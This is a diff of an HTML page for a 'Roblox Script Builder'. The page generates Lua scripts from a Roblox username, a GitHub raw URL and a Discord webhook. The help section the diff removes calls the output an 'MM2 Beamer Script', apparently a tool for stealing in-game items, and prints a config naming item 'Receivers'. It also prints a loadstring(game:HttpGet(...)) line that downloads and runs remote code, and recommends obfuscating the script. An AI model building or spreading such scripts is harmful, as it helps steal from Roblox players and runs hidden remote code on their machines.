@@ -9,69 +9,29 @@
 <body>
   <div class="app">
     <header>
-      <h1>Roblox Script 🍃</h1>
+      <h1>🎮 Roblox Script Builder</h1>
     </header>
 
     <main>
-      <!-- 🔁 Script Generator Page -->
-      <section id="scriptPage" class="page active">
-        <form id="scriptForm">
-          <input type="text" id="username" placeholder="Roblox Username" required />
-          <input type="url" id="github" placeholder="GitHub Raw URL" required />
-          <input type="url" id="webhook" placeholder="Discord Webhook URL" required />
-          <button type="submit">✨ Generate Script</button>
-        </form>
+      <form id="scriptForm">
+        <input type="text" id="username" placeholder="Roblox Username" required />
+        <input type="url" id="github" placeholder="GitHub Raw URL" required />
+        <input type="url" id="webhook" placeholder="Discord Webhook URL" required />
+        <button type="submit">✨ Generate Script</button>
+      </form>
 
-        <section id="output" class="output-card hidden">
-          <h2>✅ Your Lua Script</h2>
-          <pre id="scriptBox"></pre>
-          <div class="actions">
-            <button id="copyBtn">📋 Copy</button>
-            <button id="downloadBtn">⬇ Download</button>
-          </div>
-        </section>
-
-        <button class="toggle-help" onclick="switchToHelp()">📘 Help & Setup Guide</button>
-      </section>
-
-      <!-- 📘 Help Page -->
-      <section id="helpPage" class="page">
-        <div class="help-card">
-          <button class="back-button" onclick="switchToScript()">← Back</button>
-          <h3>🌿 MM2 Beamer Script Setup</h3>
-          <p>You can either manually enter your details or use our custom bot to generate your script automatically.</p>
-          <hr/>
-
-          <h4>🔧 Manual Setup</h4>
-          <p>Copy and update this:</p>
-<pre><code>Config = {
-  Receivers = {"username"},
-  Webhook = "Webhook url",
-  ScriptURL = "Raw GitHub https",
-}
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PRXJECT-DEV/GLOBAL-BOT-SCRIPT/refs/heads/main/Main%20Script"))()</code></pre>
-
-          <h4>🔌 Fill These:</h4>
-          <ul>
-            <li><strong>Receivers:</strong> Roblox username (⚠️ not display name)</li>
-            <li><strong>Webhook:</strong> Discord webhook</li>
-            <li><strong>ScriptURL:</strong> Raw GitHub link</li>
-          </ul>
-
-          <p>⚠️ Raw URL must start with <code>https://raw.githubusercontent.com/...</code> and no loadstring inside it.</p>
-
-          <h4>🤖 Bot Option</h4>
-          <p>Use <code>/create_script</code> in <code>&lt;#1368630892032950354&gt;</code> — the bot will DM your custom file and script.</p>
-
-          <h4>⚒️ Obfuscator</h4>
-          <p><a href="https://luaobfuscator.com/" target="_blank">luaobfuscator.com</a> recommended — or try Moose.</p>
+      <section id="output" class="output-card hidden">
+        <h2>✅ Your Lua Script</h2>
+        <pre id="scriptBox"></pre>
+        <div class="actions">
+          <button id="copyBtn">📋 Copy</button>
+          <button id="downloadBtn">⬇ Download</button>
         </div>
       </section>
     </main>
 
     <footer>
-      <p>Made By PRXJECT DEV 💜</p>
+      <p>Made with ❤️ for the Roblox community</p>
     </footer>
   </div>
 
